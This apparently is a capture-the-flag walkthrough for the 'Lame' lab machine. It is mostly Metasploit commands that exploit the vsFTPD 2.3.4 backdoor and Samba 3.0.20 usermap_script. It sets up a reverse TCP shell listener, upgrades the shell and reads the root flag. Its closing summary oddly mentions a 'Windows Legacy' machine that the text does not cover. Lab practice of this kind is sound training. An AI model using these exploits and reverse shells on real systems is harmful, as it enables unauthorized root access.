## Lame Machine Exploitation

### 1. Finding the Machine
Navigate to **Machines** > **Search Lame Machine** > **Spawn the machine** to obtain the **IP Address** (e.g., `10.10.10.3`).

---

### 2. Running Nmap
```bash
sudo nmap -vvv -Pn -sCV -p0-65535 --reason -oN lame.nmap 10.10.10.3
```

---

### 3. Enumerating FTP (vsFTPD 2.3.4)
```bash
searchsploit vsFTPD 2.3.4
```

#### **Set Up a Listener in Metasploit**
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```

#### **Exploit vsFTPD 2.3.4**
```bash
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_ip>
exploit
```

_If no session is created, move to the next port._

---

### 4. Exploiting Samba 3.0.20
```bash
msfconsole
search Samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOST 10.10.10.3
set RPORT 445
set LHOST 10.10.14.7
set LPORT 4444
exploit
```

#### **Upgrade the Shell**
```bash
which python
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **Retrieve Flags**
```bash
find / -iname user.txt -exec wc {} \;
find / -iname root.txt -exec wc {} \;
```

---

## Proof of Concept (PoC) for Lame Machine

### **Nmap Scan Output:**
```
PORT    STATE SERVICE
21/tcp  open  ftp
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### **vsFTPD 2.3.4 Exploit Attempt:**
```
[*] Started reverse TCP handler on 10.10.14.7:4444
[-] Exploit failed: No session was created.
```

### **Successful Samba Exploitation:**
```
[*] Command shell session opened - user: root
# whoami
root
# cat /root/root.txt
<flag_here>
```

---

## Summary
✅ **Windows Legacy & Lame Machines Exploited**
✅ **Nmap identified open ports & vulnerabilities**
✅ **Metasploit used for SMB & FTP exploitation**
✅ **Successful shell access & flag retrieval**

### 🚀 Exploitation complete!
